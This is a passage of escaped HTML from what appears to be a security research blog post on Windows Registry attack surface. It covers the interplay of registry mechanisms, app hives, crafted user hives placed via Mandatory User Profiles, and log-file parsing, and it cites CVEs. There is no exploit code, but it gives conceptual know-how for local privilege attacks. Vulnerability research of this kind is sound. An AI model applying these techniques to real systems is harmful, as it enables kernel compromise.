was requested on a particular key, you could be sure that it was actually performed on that key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;E&lt;/span&gt;&lt;span&gt;verything was simple, and &lt;/span&gt;&lt;span&gt;black and whi&lt;/span&gt;&lt;span&gt;te.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, over time, more and more shades of gray were being continuously added, departing from the basic assumptions&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_60bmaqde728h-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span&gt;existence of &lt;/span&gt;&lt;span&gt;predefined keys meant that every operation could no longer be performed on every key, as this special type of key was unsafe for many internal registry functions to use due to its altered semantics&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Due to symbolic links, opening a specific key doesn&amp;#39;t guarantee that it will be the intended one, as it might be a different key that the original one points&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&amp;nbsp;to.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Registry virtualization has introduced further uncertainty into key operations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;When an operation is performed on a key, it is unclear whether the operation is actually executed on that specific key or redirected to a different one.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Similarly, with read operations, a client cannot be entirely certain that it is reading from the intended key, as the data may be sourced from a &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;different, virtualized location.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Transactions in the registry mean that a given state is no longer considered solely within the global view of the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;At any given moment, there may also be changes that are visible only within a certain transaction (when they are initiated but not yet committed), and this complex scenario must be correctly handled by the kernel.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Layered keys have transformed the nature of hives, making them interdependent rather than self-contained database units.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is due to the introduction of differencing hives, which function solely as &amp;quot;patch diffs&amp;quot; and cannot exist independently without a base hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, the semantics of certain objects and their fields have been altered.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Previously, a key&amp;#39;s existence was directly tied to the presence of a corresponding key node within the hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Layered keys have disrupted this dependency.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Now, a key with a key node can be non-existent if marked as a Tombstone, and a key without a corresponding key node can logically exist if its semantics are Merge-Unbacked, referencing a lower-level key with the same name.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Of course, all of these mechanisms were designed and implemented for a specific purpose: either to make life easier for developers/applications using the Registry API, or to introduce some new functionality that is needed today.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The problem is not that they were added, but that it seems that the initial design of the registry was simply not compatible with them, so they were sort of forced into the registry, and where they didn&amp;#39;t fit, an extra layer of tape was added to hold it all together.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This ultimately led to a massive expansion of the internal state that needs to be maintained within the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is evident both in the significant increase in the size of old structures (like KCB) and in the number of new objects that have been added over the years.&lt;/span&gt;&lt;span&gt;&amp;nbsp;But t&lt;/span&gt;&lt;span&gt;he most &lt;/span&gt;&lt;span&gt;unfortunate &lt;/span&gt;&lt;span&gt;aspect is&lt;/span&gt;&lt;span&gt;&amp;nbsp;that each of these more advanced mechanisms seems to have been designed to solve one specific problem, assuming that they would operate in isolation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;And indeed, they probably do &lt;/span&gt;&lt;span&gt;under typical conditions, but a particularly malicious user could start combining these different mechanisms and making them interact.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Given the difficulty in logically determining the expected behavior of some of these combinations, it is doubtful that every such case was considered, documented, implemented, and tested by Microsoft.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The relationships between the various advanced mechanisms in the registry are humorously depicted in the image below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c44 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiFq-jAMK3aGYK7vxCE0yIKkt6eoHHGIU4hfXUSZ5f__BdBN8j8Btx0El-IOYN_i8u5g1oCGe9ap_ChfQY9SLHOEhyphenhyphenZC1chq36xunCj6NEwqi0Jng68V8mu8WoXq3eTR0I43-sx_MIlyG98UkyXlmQ0hMqQmMHzj4MS1tUVEuYPIvl0J292mwS4ZfZfLw/s960/image3.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiFq-jAMK3aGYK7vxCE0yIKkt6eoHHGIU4hfXUSZ5f__BdBN8j8Btx0El-IOYN_i8u5g1oCGe9ap_ChfQY9SLHOEhyphenhyphenZC1chq36xunCj6NEwqi0Jng68V8mu8WoXq3eTR0I43-sx_MIlyG98UkyXlmQ0hMqQmMHzj4MS1tUVEuYPIvl0J292mwS4ZfZfLw/s960/image3.png&quot; border=&quot;0&quot; alt=&quot;An image from a Pirates of the Caribbean movie shows a standoff with characters pointing pistols at each other. Text labels overlay the scene, metaphorically linking pirate actions to Windows Registry concepts. These concepts include Predefined Keys, Layered Keys, Transactions, Symbolic Links, and Registry Virtualization.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;An image from a Pirates of the Caribbean movie shows a standoff with characters pointing pistols at each other. Text labels overlay the scene, metaphorically linking pirate actions to Windows Registry concepts. These concepts include Predefined Keys, Layered Keys, Transactions, Symbolic Links, and Registry Virtualization.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Some examples of bugs caused by incorrect interactions between these mechanisms include &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451502&quot;&gt;CVE-2023-21675&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451527&quot;&gt;CVE-2023-21748&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451588&quot;&gt;CVE-2023-35356&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451589&quot;&gt;CVE-2023-35357&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451590&quot;&gt;CVE-2023-35358&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ujDEXfwdRL-c28 ujDEXfwdRL-c11&quot; id=&quot;h.fnw75hs0k169&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c42&quot;&gt;Entry points&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This section describes the entry points that a local attacker can use to interact with the registry and exploit any potential vulnerabilities.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.6eop4tb6a5vr&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Hive loading&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Let&amp;#39;s start with the operation of loading user-controlled hives.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Since hive loading is only possible from disk (and not, for example, from a memory buffer), this means that to actually trigger this attack surface, the process must be able to create a file with controlled content, or at least a controlled prefix of several kilobytes in length.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Regular programs operating at Medium IL generally have this capability, but write access to disk may be restricted for heavily sandboxed processes (e.g. renderer processes in browsers).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;When it comes to the typical type of bugs that can be triggered in this way, what primarily comes to mind are issues related to binary data parsing, and memory safety violations such as out-of-bounds buffer accesses.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is possible to encounter more logical-type issues, but they usually rely on certain assumptions about the format not being sufficiently verified, causing subsequent operations on such a hive to run into problems.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is very rare to find a vulnerability that can be both triggered and exploited by just loading the hive, without performing any follow-up actions on it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;But as &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451731&quot;&gt;CVE-2024-43452&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;demonstrates, it can &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;still happen sometimes.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.rt7ea8r3v2k7&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;App hives&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;T&lt;/span&gt;&lt;span&gt;he introduction of &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadappkeyw&quot;&gt;Application Hives&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in Windows Vista caused a significant shift in the registry attack surface.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It allowed unprivileged processes to directly interact with kernel code that was previously only accessible to system services and administrators.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Attackers gained access to much of the NtLoadKey syscall logic, including hive file operations, hive parsing at the binary level, hive validation logic in the CmpCheckRegistry function and its subfunctions, and so on.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In fact, of the 53 serious vulnerabilities I discovered during my research, 16 (around 30%) &lt;/span&gt;&lt;span&gt;either &lt;/span&gt;&lt;span&gt;required loading a controlled hive as an app hive, or were significantly easier to trigger using this mechanism.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;It&amp;#39;s important to remember that while app hives do open up a broad range of new possibilities for attackers, they don&amp;#39;t offer exactly the same capabilities as loading normal (non-app) hives due to several limitations and specific behaviors&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_i1g4wgt7686h-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;They must be loaded under the special path \Registry\A, which means an app hive cannot be loaded just anywhere in the registry hierarchy.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This special path is further protected from references by a fully qualified path, which also reduces their usefulness in some offensive applications.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c7 c10 li-bullet-0&quot;&gt;&lt;span&gt;The logic for unloading app hives differs from unloading standard hives because the process occurs automatically when all handles to the hive are closed, rather than manually unloading the hive through the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regunloadkeyw&quot;&gt;RegUnLoadKeyW&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;API or its corresponding syscall from the NtUnloadKey family.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Operations on app hive security descriptors are very limited: any calls to the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetkeysecurity&quot;&gt;RegSetKeySecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;function or &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw&quot;&gt;RegCreateKeyExW&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;with a non-default security descriptor will fail, which means that new descriptors cannot be added to such hives.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;KTM transactions are unconditionally blocked for app hives.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Despite these minor restrictions, the ability to load arbitrary hives remains one of the most useful tools when exploiting registry bugs.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Even if binary control of the hive is not strictly required, it can still be valuable.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is because it allows the attacker to &lt;/span&gt;&lt;span&gt;clearly &lt;/span&gt;&lt;span&gt;define the initial state of the hive where the attack takes place.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;By taking advantage of the cell allocator&amp;#39;s determinism, it is often possible to achieve 100% exploitation success.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c11 ujDEXfwdRL-c24&quot; id=&quot;h.psvyg0mkkua2&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;User hives and Mandatory User Profiles&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Sometimes, triggering a specific bug requires both binary control over the hive and certain features that app hives lack, such as the ability to open a key via its full path. In such cases, an alternative to app hives exists, which might be slightly less practical but still allows for exploiting these more demanding bugs. It involves directly modifying one of the two hives assigned to every user in the system: the user hive (C:\Users\NTUSER.DAT mounted under \Registry\User\&amp;lt;SID&amp;gt;, or in other words, HKCU) or the user classes hive (C:\Users\AppData\Local\Microsoft\Windows\UsrClass.dat mounted under \Registry\User\&amp;lt;SID&amp;gt;_Classes). Naturally, when these hives are actively used by the system, access to their backing files is blocked, preventing simultaneous modification, which complicates things considerably. However, there are two ways to circumvent this problem.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The first scenario involves a hypothetical attacker who has two local accounts on the targeted system, or similarly, two different users collaborating to take control of the computer (let&amp;#39;s call them users A and B). User A can grant user B full rights to modify their hive(s), &amp;nbsp;and then log out.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;User B then makes all the required binary changes to the hive and finally notifies user A that they can log back in. At this point, the Profile Service loads the modified hive on behalf of that user, and the initial goal is achieved.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The second option is more practical as it doesn&amp;#39;t require two different users.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It ab&lt;/span&gt;&lt;span&gt;uses &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/shell/mandatory-user-profiles&quot;&gt;Mandatory User Profiles&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a system functionality that prioritizes the NTUSER.MAN file in the user&amp;#39;s directory over the NTUSER.DAT file as the user hive, if it exists (it doesn&amp;#39;t exist in the default system installation).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means that a single user can place a specially prepared hive under the &lt;/span&gt;&lt;span&gt;NTUSER.MAN &lt;/span&gt;&lt;span&gt;name in their home directory, then log out and log back in. Afterwards, NTUSER.MAN will be the user&amp;#39;s active HKCU key, achieving the goal.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, the technique also has some drawbacks&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ndash; i&lt;/span&gt;&lt;span&gt;t only applies to the user hive (not UsrClass.dat), and it is somewhat noisy.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Once the NTUSER.MAN file has been created and loaded, there is no way to delete it by the same user, as it will always be loaded by the system upon login, effectively blocking access to it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;A few examples of bugs &lt;/span&gt;&lt;span&gt;involving &lt;/span&gt;&lt;span&gt;one of the two above techniques are &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451502&quot;&gt;CVE-2023-21675&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451588&quot;&gt;CVE-2023-35356&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451640&quot;&gt;CVE-2023-35633&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;They all required the existence of a special type of key called a &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;predefined key&lt;/span&gt;&lt;span&gt;&amp;nbsp;within a publicly accessible hive, such as HKCU.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Even when predefined keys were still supported, they could not be created using the system API, and the only way to craft them was by directly setting a specific flag within the internal key node structure in the hive file.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.o1kq3our4i84&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Log file parsing: .LOG/.LOG1/.LOG2&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;One of the fundamental features of the registry is that it guarantees consistency at the level of interdependent cells that together form the structure of keys within a given hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This refers to a situation where a single operation on the registry involves the simultaneous modification of multiple cells. Even if &lt;/span&gt;&lt;span&gt;there is a power outage and the system restarts &lt;/span&gt;&lt;span&gt;in the middle of performing this operation, the registry guarantees that all intermediate changes will either be applied or discarded.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Such &amp;quot;atomicity&amp;quot; of operations is necessary in order to guarantee the internal consistency of the hive structure, which, as we know, is important to security.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The&lt;/span&gt;&lt;span&gt;&amp;nbsp;mechanism is implemented by using additional files associated with the hive, where the intermediate state of registry modifications is saved with the granularity of a memory page (4 KiB), and which can be safely rolled forward or rolled back at the next hive load.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Usually these are two files with the &lt;/span&gt;&lt;span&gt;.LOG1 and .LOG2 &lt;/span&gt;&lt;span&gt;extensions, but it is also possible to force the use of a single log file with the &lt;/span&gt;&lt;span&gt;.LOG &lt;/span&gt;&lt;span&gt;extensio&lt;/span&gt;&lt;span&gt;n&lt;/span&gt;&lt;span&gt;&amp;nbsp;by passing the REG_HIVE_SINGLE_LOG flag to syscalls from the NtLoadKey family.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c30&quot;&gt;&lt;span&gt;Internally, each LOG file can be encoded in one of two formats.&lt;/span&gt;&lt;span&gt;&amp;nbsp;One &lt;/span&gt;&lt;span&gt;is the &amp;quot;legacy log file&amp;quot;, a relatively simple format that has existed since the first implementation of the registry in Windows NT 3.1.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Another one &lt;/span&gt;&lt;span&gt;is the &amp;quot;incremental log file&amp;quot;, a slightly more modern and complex format introduced in Windows 8.1 to address performance issues that plagued the previous version.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Both formats use the same header as the normal regf format (the first 512 bytes of the _HBASE_BLOCK structure, up to the CheckSum field), with the Type field set to 0x1 (legacy log file on Windows XP and newer), 0x2 (legacy log file on Windows 2000 and older), or 0x6 (incremental log file).&lt;/span&gt;&lt;span&gt;&amp;nbsp;Further at offset 0x200, l&lt;/span&gt;&lt;span&gt;egacy log files contain the signature 0x54524944 (&amp;quot;DIRT&amp;quot;) followed by the &amp;quot;dirty vector&amp;quot;, while incremental log files contain successive records represented by the magic value 0x454C7648 (&amp;quot;HvLE&amp;quot;).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;These formats are well-documented in two unofficial regf documentations: &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/libyal/libregf/blob/main/documentation/Windows%20NT%20Registry%20File%20(REGF)%20format.asciidoc&quot;&gt;GitHub: libyal/libregf&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/msuhanov/regf/blob/master/Windows%20registry%20file%20format%20specification.md&quot;&gt;GitHub: msuhanov/regf&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span&gt;Additional information can be found in the &amp;quot;Stable storage&amp;quot; and &amp;quot;Incremental logging&amp;quot; subsections of the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://www.google.com/books/edition/Windows_Internals_Part_2/L8UIvAEACAAJ?hl=en&quot;&gt;Windows Internals (Part 2, 7th Edition)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;book and its earlier editions.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;From a security perspective, it&amp;#39;s important to note that LOG files are processed for app hives, so their handling is part of the local attack surface.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On the other hand, &lt;/span&gt;&lt;span&gt;this &lt;/span&gt;&lt;span&gt;attack surface isn&amp;#39;t particularly large, as it boils down to just a few functions that are called by the two highest-level routines: HvAnalyzeLogFiles and HvpPerformLogFileRecovery.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The potential types of bugs are also fairly limited, mainly consisting of shallow memory safety violations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Two specific examples of vulnerabilities related to this functionality are &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451598&quot;&gt;CVE-2023-35386&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451600&quot;&gt;CVE-2023-38154&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.887rfj1wm7f&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Log file parsing: KTM logs&lt;/span&gt;&lt;/h4&gt;
